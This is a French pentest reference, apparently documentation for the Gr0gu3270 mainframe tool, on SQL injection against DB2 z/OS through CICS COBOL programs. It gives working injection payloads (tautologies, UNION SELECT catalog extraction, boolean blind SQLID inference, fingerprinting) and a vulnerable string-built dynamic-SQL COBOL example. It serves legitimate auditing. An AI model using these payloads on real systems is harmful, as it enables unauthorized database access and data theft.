# DB2 z/OS Injection — Reference Pentest

## Contexte

Les programmes CICS accedent a DB2 via `EXEC SQL ... END-EXEC` dans du code COBOL. L'injection SQL sur mainframe est differente du web classique : pas de stacked queries, pas de SLEEP, encodage EBCDIC, et les erreurs se manifestent par des ABENDs plutot que des messages HTTP.

## Differences DB2 z/OS vs Web classique

| Aspect | Web (MySQL/PostgreSQL) | DB2 z/OS (CICS) |
|---|---|---|
| Table dummy | `FROM DUAL` ou rien | `FROM SYSIBM.SYSDUMMY1` |
| Catalog tables | `information_schema.tables` | `SYSIBM.SYSTABLES`, `SYSIBM.SYSCOLUMNS` |
| Schemas | `information_schema.schemata` | `SYSIBM.SYSSCHEMAAUTH` |
| Privileges | `mysql.user` | `SYSIBM.SYSTABAUTH`, `SYSIBM.SYSDBAUTH` |
| Commentaire fin de ligne | `--`, `#`, `/* */` | `--` uniquement |
| Commentaire bloc | `/* */` | `/* */` (mais rare en COBOL dynamique) |
| Concatenation | `CONCAT()` ou `+` | `||` ou `CONCAT()` |
| Stacked queries | `; DROP TABLE x` | **Ne marche quasi jamais** — EXEC SQL = 1 seul statement |
| Time-based blind | `SLEEP(5)`, `WAITFOR DELAY`, `pg_sleep()` | **Pas de SLEEP** — requetes lourdes sur catalog |
| Sous-chaine | `SUBSTRING()` | `SUBSTR(col, pos, len)` |
| Longueur | `LENGTH()`, `LEN()` | `LENGTH()` |
| Char from code | `CHAR()`, `CHR()` | `CHR()` |
| Hex encode | `HEX()` | `HEX()` |
| Current user | `USER()`, `CURRENT_USER` | `CURRENT SQLID`, `USER` |
| Version | `@@version`, `VERSION()` | `GETVARIABLE('SYSIBM.VERSION')` |
| Encodage | ASCII (UTF-8) | **EBCDIC** — `'` apostrophe = 0x7D (meme byte que AID ENTER en TN3270) |

## Comment l'injection arrive

```cobol
* Vulnerable — SQL dynamique construit par STRING
STRING 'SELECT * FROM ACCOUNTS WHERE NAME = '''
       WS-INPUT
       ''''
       INTO WS-QUERY
EXEC SQL PREPARE STMT FROM :WS-QUERY END-EXEC
EXEC SQL OPEN CURSOR1 END-EXEC

* Non vulnerable — requete parametree
EXEC SQL
  SELECT * FROM ACCOUNTS
  WHERE NAME = :WS-INPUT
END-EXEC
```

Le vecteur d'injection existe quand le programme COBOL construit du SQL dynamique avec `STRING`/`UNSTRING` au lieu d'utiliser des host variables (`:WS-INPUT`). C'est plus courant qu'on ne le pense dans les programmes legacy.

## Ce que l'auditeur observe

### ABENDs (reponse immediate)

| ABEND | Signification | Severite | Action |
|---|---|---|---|
| **ASRA** | Program check — le SQL a casse le programme COBOL | CRIT | Injection confirmee. Le programme ne gere pas l'erreur SQL et crash. Documenter le payload exact. |
| **ADTC** | DL/I call error — erreur DB2 propagee a CICS | HIGH | Erreur DB2 non geree. Tester des variantes pour confirmer l'injection. |
| **AEI0** | EXEC CICS interface error | HIGH | L'erreur SQL a corrompu l'interface EXEC. Meme impact que ASRA. |
| **AEI9** | Invalid data format | MEDIUM | Type confusion — le payload a provoque une conversion de type echouee. |
| **AEY7** | Not authorized | HIGH | Le SQL a ete execute mais l'utilisateur n'a pas les droits DB2. Confirme que l'injection passe. |

### Messages ecran (information disclosure)

| Pattern ecran | Signification | Severite |
|---|---|---|
| `SQLCODE -104` | Erreur de syntaxe SQL — le payload a atteint le moteur DB2 | MEDIUM — confirme le vecteur, affiner le payload |
| `SQLCODE -204` | Table/vue non trouvee — `UNION SELECT FROM` une table qui n'existe pas | MEDIUM — le UNION fonctionne, essayer les tables catalog |
| `SQLCODE -206` | Colonne non trouvee — nombre de colonnes incorrect dans UNION | INFO — ajuster le nombre de colonnes |
| `SQLCODE -401` | Types incompatibles dans comparaison | INFO — utile pour enum des types de colonnes |
| `SQLCODE -551` | Privilege insuffisant sur l'objet | HIGH — le SQL s'execute, l'acces est bloque par DB2 (pas par l'app) |
| `SQLCODE -811` | SELECT retourne plus d'une ligne | MEDIUM — le WHERE a ete modifie, injection confirmee |
| `DSN` suivi de chiffres | Message DB2 natif (ex: `DSNT408I`) | MEDIUM — information disclosure du moteur DB2 |

### Comportement ecran (blind injection)

| Observation | Signification | Severite |
|---|---|---|
| Ecran identique au ref | Payload filtre ou champ ne va pas en DB2 | INFO |
| Ecran different, pas d'erreur | Le payload a modifie le resultat de la requete | HIGH — blind injection confirmee |
| Ecran vide / pas de donnees | Le WHERE est devenu faux (ex: `AND 1=2`) | MEDIUM — confirme l'injection via difference |
| Plus de donnees que prevu | Le WHERE a ete elargi (ex: `OR 1=1`) | HIGH — injection confirmee, donnees exfiltrees |
| Temps de reponse anormal (>5s) | Heavy query executee | MEDIUM — time-based blind potentiel |

## Techniques d'injection par ordre de priorite

### 1. Detection (est-ce que le champ va en SQL ?)

```
'                          -- apostrophe seule → ASRA/SQLCODE -104 = injection
''                         -- double apostrophe → si pas d'erreur, l'echappement fonctionne
' --                       -- commentaire → si ecran change, SQL modifie
```

### 2. Tautologie (modifier le WHERE)

```
' OR '1'='1                -- tautologie classique → plus de resultats
' OR '1'='2                -- contradiction → moins de resultats
' AND '1'='1               -- tautologie AND → memes resultats (baseline)
' AND '1'='2               -- contradiction AND → zero resultats
```

La **difference** entre tautologie et contradiction confirme l'injection.

### 3. UNION SELECT (extraire des donnees)

```
' UNION ALL SELECT NULL FROM SYSIBM.SYSDUMMY1--
' UNION ALL SELECT NULL,NULL FROM SYSIBM.SYSDUMMY1--
' UNION ALL SELECT NULL,NULL,NULL FROM SYSIBM.SYSDUMMY1--
```

On incremente les colonnes NULL jusqu'a ne plus avoir SQLCODE -206. Le nombre de NULL qui fonctionne = nombre de colonnes de la requete originale.

### 4. Extraction catalog (enumeration DB2)

```
' UNION ALL SELECT NAME FROM SYSIBM.SYSTABLES--
' UNION ALL SELECT COLNAME FROM SYSIBM.SYSCOLUMNS--
' UNION ALL SELECT GRANTEE FROM SYSIBM.SYSTABAUTH--
```

Necessite de connaitre le bon nombre de colonnes (etape 3).

### 5. Boolean blind (quand pas de retour visible)

```
' AND SUBSTR(CURRENT SQLID,1,1)='D'--
' AND LENGTH(CURRENT SQLID)>5--
```

On infere un caractere a la fois par la difference d'ecran (donnees presentes vs absentes).

### 6. ORDER BY (enum colonnes — alternative au UNION)

```
' ORDER BY 1--             -- si OK, au moins 1 colonne
' ORDER BY 10--            -- si erreur, moins de 10 colonnes
' ORDER BY 5--             -- dichotomie
```

### 7. Fonctions DB2 (fingerprint)

```
' AND 1=1 UNION ALL SELECT GETVARIABLE('SYSIBM.VERSION') FROM SYSIBM.SYSDUMMY1--
' UNION ALL SELECT CURRENT SQLID FROM SYSIBM.SYSDUMMY1--
' UNION ALL SELECT USER FROM SYSIBM.SYSDUMMY1--
```

## Particularite EBCDIC

L'apostrophe `'` est encodee 0x7D en EBCDIC, qui est aussi le byte AID pour la touche ENTER en TN3270. Gr0gu3270 gere cette collision car les apostrophes sont dans le data stream (apres le WCC), pas en position AID (premier byte).

Les caracteres `%`, `_` (wildcards SQL) ont des positions EBCDIC differentes de l'ASCII mais sont correctement traduits par la table `e2a[]`.

## Workflow auditeur avec Gr0gu3270

1. **Double-clic** sur un champ input dans la Screen Map
2. Le fuzzer **auto-selectionne** les wordlists (boundary-values → cobol-overflow → db2-injections)
3. Observer les **Findings** qui tombent en temps reel :
   - ABEND ASRA/ADTC/AEI0 = injection confirmee (CRIT/HIGH)
   - DENIED/AEY7 = le SQL passe mais droits insuffisants (HIGH)
   - NAVIGATED = ecran different, investiguer manuellement
4. Si ASRA sur `'` seul → confirme. Tester `' OR '1'='1` pour valider l'exploitation.
5. Si aucun ABEND → le champ est probablement parametre (host variable) ou ne va pas en DB2.

## References

- IBM DB2 for z/OS SQL Reference : [SC19-4066]
- IBM CICS Transaction Server Application Programming Reference
- OWASP Testing Guide — SQL Injection
- Mainframe Attack Vectors (Philip Young, DEF CON 22)
